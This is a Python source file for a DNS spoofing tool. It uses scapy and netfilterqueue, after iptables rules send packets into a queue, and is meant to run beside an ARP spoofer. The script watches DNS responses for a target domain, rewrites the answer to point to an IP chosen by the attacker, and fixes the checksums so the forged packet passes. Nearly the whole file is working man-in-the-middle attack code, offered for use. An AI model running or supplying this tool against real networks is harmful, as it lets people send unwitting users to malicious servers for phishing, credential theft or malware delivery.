# The idea of the dnspoofer is to execute this with 2 terminals, one with the spoofarp running and
# another with this script

# We also need to execute this commands:

# sudo iptables -I INPUT -j NFQUEUE --queue-num 0
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0

# To restore this:

# sudo iptables -D INPUT -j NFQUEUE --queue-num 0
# sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0
# sudo iptables -D FORWARD -j NFQUEUE --queue-num 0

from termcolor import colored
import scapy.all as scapy
import netfilterqueue
import argparse
import signal
import sys

def def_handler(sig, frame):
    print("\n[!>] Exiting script...\n")
    sys.exit()

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="Tool to spoof DNS responses for a specific domain")
    parser.add_argument("-d", "--domain", required=True, dest="domain", help="Domain name to spoof (e.g., example.com)")
    parser.add_argument("-i", "--ip",required=True, dest="ip_address", help="IP address to associate with the spoofed domain")
    return parser.parse_args()

def color_helper(text, type):
    if type.lower() == "error":
        print(f"{colored('[!', 'yellow')}{colored(' Spoofer Error ', 'red')}{colored('>]', 'yellow')} {colored(text, 'yellow')}")

    elif type.lower() == "info":
        print(f"{colored('[!', 'yellow')}{colored(' Spoofer Info ', 'cyan')}{colored('>]', 'yellow')} {colored(text, 'cyan')}")

    elif type.lower() == "detected":
        print(f"{colored('[!', 'red')}{colored(' Spoofer Detect ', 'yellow')}{colored('>]', 'red')} {colored(text, 'red')}")


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())    

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname 
        src = scapy_packet[scapy.IP].src
 
        if spoof_domain.encode() in qname:
            color_helper(f"Poisoning request to domain: {spoof_domain} from {src}.", "info")
            
            # Asign our modified packet to the DNS response request
            answer = scapy.DNSRR(rrname=qname, rdata=spoof_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Delete len and checksum for the packet to be valid (bypass verification)
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Set our modified packet to the packet in the queue
            packet.set_payload(scapy_packet.build())


    packet.accept()


if __name__ == "__main__":
    global spoof_domain, spoof_ip
    args = get_arguments()

    spoof_domain = args.domain
    spoof_ip = args.ip_address

    color_helper(f"Starting poisoning process to the domain: {spoof_domain} to {spoof_ip}", "info")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()